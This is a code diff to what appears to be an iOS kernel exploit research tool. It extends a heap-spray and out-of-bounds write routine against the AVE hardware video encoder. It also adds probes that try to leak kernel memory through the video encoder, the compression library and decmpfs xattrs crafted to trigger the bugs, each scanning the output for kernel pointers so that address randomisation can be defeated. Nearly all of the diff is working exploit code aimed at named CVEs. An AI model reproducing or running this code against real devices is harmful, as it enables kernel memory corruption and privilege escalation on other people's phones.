@@ -47,6 +47,11 @@
 #include <IOKit/IOKitLib.h>
 #include <dlfcn.h>
 #include <os/log.h>
+#include <sys/xattr.h>
+#include <sys/stat.h>
+#include <dirent.h>
+#include <fcntl.h>
+#include <errno.h>
 
 #ifndef kIOMasterPortDefault
 #define kIOMasterPortDefault ((mach_port_t)0)
@@ -11777,10 +11782,12 @@ vps_cd_done:
          * With NTL=20067+, the write extends past the entire 0x18000 page run,
          * reaching deep into adjacent pClient data.
          *
-         * Usage: spray_write <num_sessions> <armed_ntl> [hole_index]
+         * Usage: spray_write <num_sessions> <armed_ntl> [hole_index] [width] [height]
          *   num_sessions: total filler sessions (default 8)
          *   armed_ntl: NTL for the armed session (e.g. 16466, 20100)
          *   hole_index: which filler to free (default: middle)
+         *   width/height: resolution controls write value w24 (default: 192x192 → w24=15)
+         *     192x192→w24=15, 512x512→w24=2, 576x576→w24=1, 1024x1024→w24=0
          *
          * The armed session is NOT torn down (leaked) to avoid crash.
          * Filler sessions ARE torn down to check for corruption effects.
@@ -11788,19 +11795,46 @@ vps_cd_done:
         int num_sess = (argc > 2) ? atoi(argv[2]) : 8;
         int armed_ntl = (argc > 3) ? atoi(argv[3]) : 16466;
         int hole_idx = (argc > 4) ? atoi(argv[4]) : (num_sess / 2);
+        int vw = (argc > 5) ? atoi(argv[5]) : 192;
+        int vh = (argc > 6) ? atoi(argv[6]) : vw;
         if (num_sess < 3) num_sess = 3;
         if (num_sess > 32) num_sess = 32;
         if (hole_idx < 1) hole_idx = 1;
         if (hole_idx >= num_sess - 1) hole_idx = num_sess - 2;
+        if (vw < 64) vw = 64;
+        if (vh < 64) vh = 64;
 
-        int vw = 192, vh = 192;
         rlog("=== SPRAY_WRITE: Heap spray + OOB write into adjacent object ===\n");
         rlog("Fillers: %d, Armed NTL: %d, Hole index: %d, res=%dx%d\n",
              num_sess, armed_ntl, hole_idx, vw, vh);
         rlog("Each pClient: 0x147c8 bytes in kalloc_large (0x18000 page run)\n");
-        unsigned long write_end = 0x4678 + ((unsigned long)(armed_ntl - 2)) * 4;
-        rlog("Armed write extends to: pClient+0x%lx (overflow=%ld bytes past 0x18000)\n\n",
-             write_end, (long)write_end - 0x18000);
+        unsigned long l1_end = 0x4678 + ((unsigned long)(armed_ntl - 2)) * 4;
+        unsigned long l2_end = 0x6424 + ((unsigned long)(armed_ntl - 2)) * 4;
+        unsigned long l3_end = 0x8098 + ((unsigned long)(armed_ntl - 2)) * 4;
+        rlog("Loop 1 end: pClient+0x%lx (%s pool[0]@0x147B0, %s adj@0x18000)\n",
+             l1_end, l1_end >= 0x147B0 ? "HITS" : "before",
+             l1_end >= 0x18000 ? "OVERFLOWS" : "within");
+        rlog("Loop 2 end: pClient+0x%lx (%s pool[0], %s adj)\n",
+             l2_end, l2_end >= 0x147B0 ? "HITS" : "before",
+             l2_end >= 0x18000 ? "OVERFLOWS" : "within");
+        rlog("Loop 3 end: pClient+0x%lx (%s pool[0], %s adj)\n",
+             l3_end, l3_end >= 0x147B0 ? "HITS" : "before",
+             l3_end >= 0x18000 ? "OVERFLOWS" : "within");
+        if (l3_end > 0x18000) {
+            rlog("Loop 3 overflow: %lu bytes into adjacent object\n", l3_end - 0x18000);
+        }
+        if (l2_end > 0x18000) {
+            rlog("Loop 2 overflow: %lu bytes into adjacent object\n", l2_end - 0x18000);
+        }
+        if (l1_end > 0x18000) {
+            rlog("Loop 1 overflow: %lu bytes into adjacent object\n", l1_end - 0x18000);
+        }
+        int max_dpb = (983040 / (vw * vh));
+        if (max_dpb > 16) max_dpb = 16;
+        if (max_dpb < 1) max_dpb = 1;
+        int w24 = max_dpb - 1;
+        rlog("Write value w24=%d (0x%x) at %dx%d (MaxDpbSize=%d)\n\n",
+             w24, w24, vw, vh, max_dpb);
 
         /* Phase 1: Create filler sessions */
         rlog("--- Phase 1: Creating %d filler sessions ---\n", num_sess);
@@ -12751,6 +12785,578 @@ vps_cd_done:
         }
 
         rlog("=== HEAP_REUSE complete ===\n");
+
+    } else if (strcmp(mode, "ave_read_leak") == 0) {
+        /*
+         * ave_read_leak — AVE OOB read info leak probe
+         *
+         * CVE-2026-112465 and CVE-2026-112466 are OOB reads in AVEVideoEncoder
+         * that leak kernel memory. Fixed in 27.2 with "improved bounds checking"
+         * and "improved input validation". Both credited to Hcamael.
+         *
+         * Theory: Corrupting certain pClient fields via NTL OOB write may cause
+         * the encoder to READ from OOB kernel memory and embed that data in the
+         * encoded bitstream. This probe:
+         *   1. Encodes a frame with NTL=2 (clean baseline), saves full NAL output
+         *   2. Encodes same frame with corrupted NTL, saves full NAL output
+         *   3. Compares outputs byte-by-byte, looking for:
+         *      - Bytes that differ (encoder read different source data)
+         *      - 8-byte aligned values matching kernel pointer ranges
+         *      - Sections of output that contain non-video-data patterns
+         *
+         * The NTL values tested: 3-7 (within working range), plus specific
+         * values that corrupt fields adjacent to read-path structures.
+         *
+         * Usage: ave_read_leak [ntl] [width] [height]
+         *   ntl: NTL value to test (default: 7, last working)
+         *   width/height: resolution (default: 192x128)
+         */
+        int test_ntl = (argc > 2) ? atoi(argv[2]) : 7;
+        int w = (argc > 3) ? atoi(argv[3]) : 192;
+        int h = (argc > 4) ? atoi(argv[4]) : 128;
+        rlog("=== AVE_READ_LEAK: OOB read info leak probe ===\n");
+        rlog("Target NTL=%d, resolution=%dx%d\n", test_ntl, w, h);
+        rlog("Targeting CVE-2026-112465/112466 pattern\n\n");
+
+        /* Storage for baseline and corrupted NAL outputs */
+        #define ARL_MAX_NAL 65536
+        static uint8_t baseline_nal[ARL_MAX_NAL];
+        static uint8_t corrupted_nal[ARL_MAX_NAL];
+        size_t baseline_len = 0, corrupted_len = 0;
+
+        /* Encode helper - creates session, encodes 1 frame, captures output */
+        for (int pass = 0; pass < 2; pass++) {
+            int cur_ntl = (pass == 0) ? 2 : test_ntl;
+            rlog("--- Pass %d: NTL=%d %s ---\n", pass, cur_ntl,
+                 pass == 0 ? "(baseline)" : "(corrupted)");
+
+            /* Create pixel buffer */
+            CVPixelBufferRef pb = NULL;
+            NSDictionary *pba = @{
+                (id)kCVPixelBufferWidthKey: @(w),
+                (id)kCVPixelBufferHeightKey: @(h),
+                (id)kCVPixelBufferIOSurfacePropertiesKey: @{}
+            };
+            CVReturn cvr = CVPixelBufferCreate(NULL, w, h,
+                kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+                (__bridge CFDictionaryRef)pba, &pb);
+            if (cvr != 0 || !pb) {
+                rlog("CVPixelBufferCreate failed: %d\n", cvr);
+                break;
+            }
+
+            /* Fill with deterministic pattern so diffs are meaningful */
+            CVPixelBufferLockBaseAddress(pb, 0);
+            size_t y_bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
+            size_t y_h = CVPixelBufferGetHeightOfPlane(pb, 0);
+            uint8_t *y_base = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+            if (y_base) {
+                for (size_t row = 0; row < y_h; row++)
+                    memset(y_base + row * y_bpr, (uint8_t)(row * 3 + 42), w);
+            }
+            size_t uv_bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
+            size_t uv_h = CVPixelBufferGetHeightOfPlane(pb, 1);
+            uint8_t *uv_base = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+            if (uv_base) {
+                for (size_t row = 0; row < uv_h; row++)
+                    memset(uv_base + row * uv_bpr, 128, w);
+            }
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            /* Create compression session with NTL */
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &cur_ntl);
+            CFDictionarySetValue(enc_spec, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+
+            int v = 1;
+            CFNumberRef one = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), one);
+            CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), one);
+            CFRelease(one);
+
+            g_encode_done = 0;
+            g_cb_status = -999;
+            g_cb_count = 0;
+            g_cb_had_buf = 0;
+            g_last_nal_size = 0;
+            memset(g_saved_nal, 0, sizeof(g_saved_nal));
+            g_saved_nal_len = 0;
+
+            VTCompressionSessionRef s = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+
+            if (st != 0 || !s) {
+                rlog("VTCompressionSessionCreate failed: %d\n", (int)st);
+                CVPixelBufferRelease(pb);
+                break;
+            }
+
+            /* Set bitrate to fixed value for reproducibility */
+            int br = 500000;
+            CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &br);
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_AverageBitRate, brn);
+            CFRelease(brn);
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+            /* Prepare and encode */
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog("PrepareToEncodeFrames: %d\n", (int)st);
+
+            CMTime pts = CMTimeMake(0, 30);
+            st = VTCompressionSessionEncodeFrame(s, pb, pts, kCMTimeInvalid,
+                NULL, NULL, NULL);
+            rlog("EncodeFrame: %d\n", (int)st);
+            CVPixelBufferRelease(pb);
+
+            if (st == 0) {
+                st = VTCompressionSessionCompleteEncoding(s);
+                rlog("CompleteEncoding: %d\n", (int)st);
+
+                /* Wait for callback */
+                for (int w8 = 0; w8 < 100 && !g_encode_done; w8++)
+                    usleep(10000);
+
+                rlog("Callback: status=%d count=%d had_buf=%d nal_size=%zu\n",
+                     (int)g_cb_status, g_cb_count, g_cb_had_buf, g_last_nal_size);
+
+                if (pass == 0) {
+                    baseline_len = g_saved_nal_len;
+                    if (baseline_len > ARL_MAX_NAL) baseline_len = ARL_MAX_NAL;
+                    memcpy(baseline_nal, g_saved_nal, baseline_len);
+                    rlog("Baseline captured: %zu bytes\n", baseline_len);
+                } else {
+                    corrupted_len = g_saved_nal_len;
+                    if (corrupted_len > ARL_MAX_NAL) corrupted_len = ARL_MAX_NAL;
+                    memcpy(corrupted_nal, g_saved_nal, corrupted_len);
+                    rlog("Corrupted captured: %zu bytes\n", corrupted_len);
+                }
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            usleep(100000);
+        }
+
+        /* Compare */
+        if (baseline_len > 0 && corrupted_len > 0) {
+            rlog("\n--- Comparison ---\n");
+            rlog("Baseline: %zu bytes, Corrupted: %zu bytes\n",
+                 baseline_len, corrupted_len);
+
+            size_t cmp_len = baseline_len < corrupted_len ? baseline_len : corrupted_len;
+            int diff_count = 0;
+            int ptr_count = 0;
+
+            for (size_t i = 0; i < cmp_len; i++) {
+                if (baseline_nal[i] != corrupted_nal[i]) diff_count++;
+            }
+            rlog("Differing bytes in common range: %d / %zu\n", diff_count, cmp_len);
+
+            /* Scan corrupted output for kernel pointer patterns */
+            rlog("\nScanning corrupted output for kernel pointers...\n");
+            for (size_t i = 0; i + 7 < corrupted_len; i++) {
+                uint64_t val = 0;
+                memcpy(&val, corrupted_nal + i, 8);
+                if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                    rlog("  CANDIDATE at offset %zu: 0x%016llx\n",
+                         i, (unsigned long long)val);
+                    ptr_count++;
+                    if (ptr_count >= 20) { rlog("  (truncated)\n"); break; }
+                }
+            }
+            if (ptr_count == 0) rlog("  No kernel pointer patterns found\n");
+
+            /* Scan extra bytes in longer output */
+            if (corrupted_len > baseline_len) {
+                rlog("\nExtra %zu bytes in corrupted output:\n",
+                     corrupted_len - baseline_len);
+                size_t extra_start = baseline_len;
+                for (size_t i = extra_start; i < corrupted_len && i < extra_start + 256; i++) {
+                    if ((i - extra_start) % 32 == 0) rlog("\n  +%04zu: ", i - extra_start);
+                    rlog("%02x", corrupted_nal[i]);
+                }
+                rlog("\n");
+            }
+
+            /* Show first 10 diff positions with context */
+            if (diff_count > 0 && diff_count <= 100) {
+                rlog("\nDiff positions (first 10):\n");
+                int shown = 0;
+                for (size_t i = 0; i < cmp_len && shown < 10; i++) {
+                    if (baseline_nal[i] != corrupted_nal[i]) {
+                        rlog("  [%zu] base=0x%02x corr=0x%02x\n",
+                             i, baseline_nal[i], corrupted_nal[i]);
+                        shown++;
+                    }
+                }
+            }
+        } else {
+            rlog("\nInsufficient data for comparison\n");
+        }
+
+        rlog("\n=== AVE_READ_LEAK complete ===\n");
+
+    } else if (strcmp(mode, "compress_leak") == 0) {
+        /*
+         * compress_leak — Compression framework kernel memory disclosure probe
+         *
+         * CVE-2026-113910: "An app may be able to disclose kernel memory."
+         * Fix: "A memory initialization issue was addressed with improved
+         * memory handling." Credit: Tucker Willenborg.
+         *
+         * Classic uninit-data pattern: kernel compression subsystem returns
+         * a buffer with uninitialized bytes containing stale kernel heap data.
+         *
+         * Tests:
+         *   1. Compress/decompress cycles with various algorithms
+         *   2. Edge-case buffer sizes (page-aligned, off-by-one)
+         *   3. Partial decompression to trigger short reads
+         *   4. Check output padding/trailing bytes for kernel data
+         *
+         * Usage: compress_leak [rounds]
+         *   rounds: iterations per algorithm (default: 100)
+         */
+        /* Note: compression.h is part of libcompression, available on iOS */
+        int rounds = (argc > 2) ? atoi(argv[2]) : 100;
+        rlog("=== COMPRESS_LEAK: Kernel memory disclosure via compression ===\n");
+        rlog("Rounds per algorithm: %d\n", rounds);
+        rlog("Target: CVE-2026-113910 (uninit data in compression buffers)\n\n");
+
+        /* Use dlsym to access compression functions without header dependency */
+        typedef size_t (*compress_fn)(uint8_t *, size_t, const uint8_t *, size_t, int);
+        typedef size_t (*decompress_fn)(uint8_t *, size_t, const uint8_t *, size_t, int);
+
+        compress_fn comp = (compress_fn)dlsym(RTLD_DEFAULT, "compression_encode_buffer");
+        decompress_fn decomp = (decompress_fn)dlsym(RTLD_DEFAULT, "compression_decode_buffer");
+
+        if (!comp || !decomp) {
+            rlog("ERROR: compression functions not found via dlsym\n");
+        } else {
+            rlog("compression_encode_buffer: %p\n", (void*)comp);
+            rlog("compression_decode_buffer: %p\n", (void*)decomp);
+
+            /* Algorithm IDs: LZ4=0x100, ZLIB=0x205, LZMA=0x306, LZ4_RAW=0x101,
+               LZFSE=0x801 */
+            int algos[] = { 0x100, 0x205, 0x801, 0x101 };
+            const char *algo_names[] = { "LZ4", "ZLIB", "LZFSE", "LZ4_RAW" };
+            int nalgo = 4;
+
+            int total_suspicious = 0;
+
+            for (int ai = 0; ai < nalgo; ai++) {
+                rlog("\n--- Algorithm: %s (0x%x) ---\n", algo_names[ai], algos[ai]);
+                int algo_hits = 0;
+
+                for (int round = 0; round < rounds; round++) {
+                    /* Create input with known pattern */
+                    size_t in_sz = 4096 + (round % 128);
+                    uint8_t *input = calloc(1, in_sz);
+                    if (!input) continue;
+                    for (size_t i = 0; i < in_sz; i++)
+                        input[i] = (uint8_t)(i ^ (round * 7));
+
+                    /* Compress */
+                    size_t comp_sz = in_sz * 2 + 4096;
+                    uint8_t *comp_buf = malloc(comp_sz);
+                    if (!comp_buf) { free(input); continue; }
+                    memset(comp_buf, 0xCC, comp_sz);
+
+                    size_t comp_out = comp(comp_buf, comp_sz, input, in_sz, algos[ai]);
+                    if (comp_out == 0) {
+                        free(input); free(comp_buf);
+                        continue;
+                    }
+
+                    /* Decompress into oversized buffer, check trailing bytes */
+                    size_t decomp_sz = in_sz * 4;
+                    uint8_t *decomp_buf = malloc(decomp_sz);
+                    if (!decomp_buf) { free(input); free(comp_buf); continue; }
+                    memset(decomp_buf, 0xBB, decomp_sz);
+
+                    size_t decomp_out = decomp(decomp_buf, decomp_sz,
+                        comp_buf, comp_out, algos[ai]);
+
+                    if (decomp_out > 0) {
+                        /* Check if decompressed data matches original */
+                        int mismatch = 0;
+                        size_t check_len = decomp_out < in_sz ? decomp_out : in_sz;
+                        for (size_t i = 0; i < check_len; i++) {
+                            if (decomp_buf[i] != input[i]) { mismatch++; break; }
+                        }
+
+                        /* Check trailing bytes after decompressed output */
+                        for (size_t i = decomp_out; i + 7 < decomp_sz && i < decomp_out + 4096; i++) {
+                            uint64_t val = 0;
+                            memcpy(&val, decomp_buf + i, 8);
+                            if (val != 0xBBBBBBBBBBBBBBBBULL && val != 0 &&
+                                ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF)) {
+                                if (algo_hits < 5)
+                                    rlog("  [r%d] TRAILING PTR at decomp+%zu: 0x%016llx\n",
+                                         round, i, (unsigned long long)val);
+                                algo_hits++;
+                                total_suspicious++;
+                            }
+                        }
+
+                        /* Also check if decompress returned MORE than input size */
+                        if (decomp_out > in_sz) {
+                            rlog("  [r%d] OVERREAD: decomp=%zu > input=%zu (extra %zu bytes)\n",
+                                 round, decomp_out, in_sz, decomp_out - in_sz);
+                            /* Scan extra bytes */
+                            for (size_t i = in_sz; i + 7 < decomp_out; i++) {
+                                uint64_t val = 0;
+                                memcpy(&val, decomp_buf + i, 8);
+                                if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                                    rlog("    EXTRA PTR at +%zu: 0x%016llx\n",
+                                         i, (unsigned long long)val);
+                                    total_suspicious++;
+                                }
+                            }
+                        }
+
+                        /* Test partial decompression: give smaller dst buffer */
+                        size_t partial_sz = in_sz / 2;
+                        uint8_t *partial_buf = malloc(partial_sz + 256);
+                        if (partial_buf) {
+                            memset(partial_buf, 0xDD, partial_sz + 256);
+                            size_t partial_out = decomp(partial_buf, partial_sz,
+                                comp_buf, comp_out, algos[ai]);
+                            /* Check bytes after partial output */
+                            for (size_t i = partial_out; i + 7 < partial_sz + 256; i++) {
+                                uint64_t val = 0;
+                                memcpy(&val, partial_buf + i, 8);
+                                if (val != 0xDDDDDDDDDDDDDDDDULL && val != 0 &&
+                                    ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF)) {
+                                    if (algo_hits < 5)
+                                        rlog("  [r%d] PARTIAL PTR at +%zu: 0x%016llx\n",
+                                             round, i, (unsigned long long)val);
+                                    algo_hits++;
+                                    total_suspicious++;
+                                }
+                            }
+                            free(partial_buf);
+                        }
+                    }
+
+                    free(input);
+                    free(comp_buf);
+                    free(decomp_buf);
+                }
+                rlog("  %s: %d suspicious values in %d rounds\n",
+                     algo_names[ai], algo_hits, rounds);
+            }
+
+            rlog("\n--- Summary ---\n");
+            rlog("Total suspicious kernel-like values: %d\n", total_suspicious);
+            if (total_suspicious > 0)
+                rlog("*** POTENTIAL KERNEL MEMORY DISCLOSURE DETECTED ***\n");
+            else
+                rlog("No kernel pointer patterns found in compression output\n");
+        }
+
+        rlog("\n=== COMPRESS_LEAK complete ===\n");
+
+    } else if (strcmp(mode, "decmpfs_leak") == 0) {
+        /*
+         * decmpfs_leak — APFS/HFS+ transparent decompression info leak probe
+         *
+         * CVE-2026-113910 is most likely in the decmpfs (kernel transparent
+         * file decompression) path, same pattern as CVE-2015-3677.
+         *
+         * When reading a file with com.apple.decmpfs xattr, the kernel
+         * decompresses inline. If the output buffer isn't fully initialized,
+         * trailing bytes contain stale kernel heap data.
+         *
+         * Approach:
+         *   1. Create a file in our sandbox container
+         *   2. Set com.apple.decmpfs xattr with crafted compressed data
+         *   3. Read the file — kernel decompresses via decmpfs
+         *   4. Check if returned data has extra bytes / kernel patterns
+         *
+         * Also tests: reading already-compressed system files and checking
+         * for over-read in the returned data.
+         *
+         * Usage: decmpfs_leak [rounds]
+         */
+        int rounds = (argc > 2) ? atoi(argv[2]) : 50;
+        rlog("=== DECMPFS_LEAK: Kernel decompression info leak probe ===\n");
+        rlog("Rounds: %d\n", rounds);
+        rlog("Target: CVE-2026-113910 (decmpfs uninit data)\n\n");
+
+        /* First, scan some system files for compressed attributes */
+        rlog("--- Phase 1: Scanning for compressed system files ---\n");
+        const char *scan_dirs[] = {
+            "/System/Library/Frameworks",
+            "/usr/lib",
+            "/System/Library/PrivateFrameworks",
+            NULL
+        };
+
+        int compressed_found = 0;
+        for (int di = 0; scan_dirs[di] && compressed_found < 5; di++) {
+            DIR *d = opendir(scan_dirs[di]);
+            if (!d) { rlog("  %s: cannot open\n", scan_dirs[di]); continue; }
+            struct dirent *ent;
+            int checked = 0;
+            while ((ent = readdir(d)) && compressed_found < 5 && checked < 100) {
+                if (ent->d_name[0] == '.') continue;
+                checked++;
+                char path[1024];
+                snprintf(path, sizeof(path), "%s/%s", scan_dirs[di], ent->d_name);
+
+                /* Check for com.apple.decmpfs xattr */
+                ssize_t xsz = getxattr(path, "com.apple.decmpfs", NULL, 0, 0, 0);
+                if (xsz > 0) {
+                    rlog("  COMPRESSED: %s (xattr %zd bytes)\n", path, xsz);
+                    compressed_found++;
+
+                    /* Read the xattr */
+                    uint8_t xbuf[256];
+                    ssize_t xread = getxattr(path, "com.apple.decmpfs", xbuf,
+                        sizeof(xbuf), 0, 0);
+                    if (xread >= 16) {
+                        uint32_t magic = *(uint32_t *)xbuf;
+                        uint32_t comp_type = *(uint32_t *)(xbuf + 4);
+                        uint64_t uncomp_sz = *(uint64_t *)(xbuf + 8);
+                        rlog("    magic=0x%08x type=%u uncompressed=%llu\n",
+                             magic, comp_type, (unsigned long long)uncomp_sz);
+                    }
+
+                    /* Read the file itself — kernel decompresses */
+                    int fd = open(path, O_RDONLY);
+                    if (fd >= 0) {
+                        struct stat st;
+                        fstat(fd, &st);
+                        size_t fsz = st.st_size;
+                        rlog("    file size (decompressed): %zu\n", fsz);
+
+                        /* Read into oversized buffer */
+                        size_t bufsz = fsz + 4096;
+                        uint8_t *buf = malloc(bufsz);
+                        if (buf) {
+                            memset(buf, 0xAA, bufsz);
+                            ssize_t nread = read(fd, buf, bufsz);
+                            rlog("    read() returned: %zd\n", nread);
+
+                            /* Check trailing bytes after content */
+                            if (nread > 0 && (size_t)nread <= fsz) {
+                                int ptrs = 0;
+                                for (size_t i = nread; i + 7 < bufsz; i++) {
+                                    uint64_t val;
+                                    memcpy(&val, buf + i, 8);
+                                    if (val != 0xAAAAAAAAAAAAAAAAULL && val != 0 &&
+                                        ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF)) {
+                                        rlog("    TRAILING PTR at +%zu: 0x%016llx\n",
+                                             i, (unsigned long long)val);
+                                        ptrs++;
+                                        if (ptrs >= 5) break;
+                                    }
+                                }
+                            }
+                            free(buf);
+                        }
+                        close(fd);
+                    }
+                }
+            }
+            closedir(d);
+        }
+        rlog("Found %d compressed files\n\n", compressed_found);
+
+        /* Phase 2: Create our own compressed file via xattr */
+        rlog("--- Phase 2: Crafted decmpfs xattr probe ---\n");
+        char tmppath[256];
+        snprintf(tmppath, sizeof(tmppath), "/tmp/decmpfs_probe_%d", getpid());
+
+        int total_hits = 0;
+        for (int r = 0; r < rounds; r++) {
+            /* Create a regular file */
+            int fd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (fd < 0) {
+                if (r == 0) rlog("Cannot create temp file: %s\n", strerror(errno));
+                break;
+            }
+            close(fd);
+
+            /* Craft decmpfs xattr header:
+             * magic: 0x636D7066 ("fpmc" little-endian)
+             * compression_type: 3 (data stored in xattr, type ZLIB)
+             *   or 4 (data stored in resource fork)
+             * uncompressed_size: declared size
+             * followed by compressed data inline (for type 3)
+             */
+            uint8_t xattr_data[512];
+            memset(xattr_data, 0, sizeof(xattr_data));
+            *(uint32_t *)(xattr_data) = 0x636D7066;  /* magic */
+            *(uint32_t *)(xattr_data + 4) = 3;       /* type: inline data in xattr */
+            /* Declare larger uncompressed size than actual data */
+            uint64_t declared_sz = 8192 + (r * 64);
+            *(uint64_t *)(xattr_data + 8) = declared_sz;
+            /* Put some compressed-looking data after the header (16 bytes) */
+            /* For type 3 with small data, the actual content is at offset 16 */
+            size_t inline_data_sz = 128 + (r % 64);
+            for (size_t i = 0; i < inline_data_sz; i++)
+                xattr_data[16 + i] = (uint8_t)(i ^ (r * 13));
+
+            ssize_t xsz = 16 + inline_data_sz;
+            int xr = setxattr(tmppath, "com.apple.decmpfs", xattr_data, xsz, 0, 0);
+            if (r == 0) rlog("setxattr(com.apple.decmpfs): %d (errno=%d %s)\n",
+                             xr, errno, xr < 0 ? strerror(errno) : "OK");
+
+            if (xr == 0) {
+                /* Also set UF_COMPRESSED flag */
+                struct stat st;
+                stat(tmppath, &st);
+                chflags(tmppath, st.st_flags | 0x0020); /* UF_COMPRESSED */
+
+                /* Now read the file — kernel should decompress */
+                fd = open(tmppath, O_RDONLY);
+                if (fd >= 0) {
+                    size_t rbufsz = declared_sz + 4096;
+                    uint8_t *rbuf = malloc(rbufsz);
+                    if (rbuf) {
+                        memset(rbuf, 0xEE, rbufsz);
+                        ssize_t nread = read(fd, rbuf, rbufsz);
+
+                        if (r < 3)
+                            rlog("  [r%d] declared=%llu read=%zd\n",
+                                 r, (unsigned long long)declared_sz, nread);
+
+                        if (nread > 0) {
+                            /* Scan ALL returned bytes for kernel pointers */
+                            for (ssize_t i = 0; i + 7 < nread; i++) {
+                                uint64_t val;
+                                memcpy(&val, rbuf + i, 8);
+                                if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                                    if (total_hits < 10)
+                                        rlog("  [r%d] KERNEL PTR at +%zd: 0x%016llx\n",
+                                             r, i, (unsigned long long)val);
+                                    total_hits++;
+                                }
+                            }
+                        }
+                        free(rbuf);
+                    }
+                    close(fd);
+                }
+            }
+            unlink(tmppath);
+        }
+
+        rlog("\n--- Summary ---\n");
+        rlog("Total kernel pointer candidates: %d\n", total_hits);
+        if (total_hits > 0)
+            rlog("*** POTENTIAL KERNEL INFO LEAK VIA DECMPFS! ***\n");
+        else
+            rlog("No kernel data leaked through decompression\n");
+
+        rlog("\n=== DECMPFS_LEAK complete ===\n");
 
     } else if (strcmp(mode, "kaslr_probe") == 0) {
         /*
